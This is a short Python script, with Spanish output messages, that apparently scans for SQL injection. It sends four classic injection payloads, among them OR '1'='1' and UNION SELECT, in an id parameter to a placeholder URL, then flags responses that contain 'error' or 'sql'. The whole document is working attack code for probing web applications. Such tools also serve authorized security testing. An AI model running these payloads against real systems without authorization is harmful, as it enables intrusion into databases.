import requests

url = "http://example.com/?id="

payloads = ["1'", "1'--", "1' OR '1'='1", "1' UNION SELECT null,null--"]

for p in payloads:
    r = requests.get(url + p)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Posible SQLi detectada con payload: {p}")
    else:
        print(f"[-] Sin indicios con payload: {p}")
